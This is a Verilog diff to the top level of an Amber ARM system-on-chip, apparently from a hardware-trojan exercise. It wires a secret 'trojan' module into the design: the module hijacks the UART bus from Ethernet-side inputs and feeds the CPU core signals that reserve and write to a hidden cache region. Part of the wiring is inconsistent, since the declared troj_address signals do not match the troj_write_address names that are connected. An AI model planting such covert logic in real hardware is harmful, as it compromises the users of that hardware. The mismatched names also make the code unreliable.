@@ -217,24 +217,32 @@ clocks_resets u_clocks_resets (
 // -------------------------------------------------------------
 /// Instatiate Trojan Hardware (shhhh! Secret)
 // -------------------------------------------------------------
-wire troj_reserve;
-assign troj_reserve = 1; 	/// Put this signal through trojan.v eventually
+wire 		troj_reserve;
+wire [31:0]	troj_write_data;
+wire [31:0] troj_address;
+wire [31:0] troj_address_nxt;
+
 wire control_uart;
 wire [31:0] troj_s_wb_adr;
 wire        troj_s_wb_we;
 wire [31:0] troj_s_wb_dat_w;
 wire        troj_s_wb_stb;
 trojan trojan0 (
-    .i_clk              (sys_clk),
-    .i_rst              (sys_rst),
-    .i_eth_s_wb_ack     (s_wb_ack[0]),
-    .i_eth_s_wb_dat_r   (s_wb_dat_r[0]),
-    .i_ethmac_int       (ethmac_int),
-    .o_control_uart     (control_uart),
-    .o_uart_s_wb_adr    (troj_s_wb_adr),
-    .o_uart_s_wb_we     (troj_s_wb_we),
-    .o_uart_s_wb_dat_w  (troj_s_wb_dat_w),
-    .o_uart_s_wb_stb    (troj_s_wb_stb)
+    .i_clk              	(sys_clk),
+    .i_rst              	(sys_rst),
+    .i_eth_s_wb_ack     	(s_wb_ack[0]),
+    .i_eth_s_wb_dat_r   	(s_wb_dat_r[0]),
+    .i_ethmac_int       	(ethmac_int),
+    .o_control_uart     	(control_uart),
+    .o_uart_s_wb_adr    	(troj_s_wb_adr),
+    .o_uart_s_wb_we     	(troj_s_wb_we),
+    .o_uart_s_wb_dat_w  	(troj_s_wb_dat_w),
+    .o_uart_s_wb_stb    	(troj_s_wb_stb),
+	
+	.o_troj					(troj_reserve),
+	.o_troj_write_data		(troj_write_data),
+	.o_troj_write_addr		(troj_write_address),
+	.o_troj_write_addr_nxt	(troj_write_address_nxt)
 );
 
 // Take control of the uart lines
@@ -269,7 +277,10 @@ a23_core u_amber (
     .i_wb_ack       ( m_wb_ack  [1]   ),
     .i_wb_err       ( m_wb_err  [1]   ),
 	
-	.i_troj_reserve ( troj_reserve	  )		/// Trojan signal for reserving upper cache area
+	.i_troj_reserve 	( troj_reserve	  ),	/// Trojan signal for reserving upper cache area
+	.i_troj_write_data	( troj_write_data ),	/// Trojan data written to cache
+	.i_troj_address		( troj_address	  ),
+	.i_troj_address_nxt ( troj_address_nxt)
 );
 
 
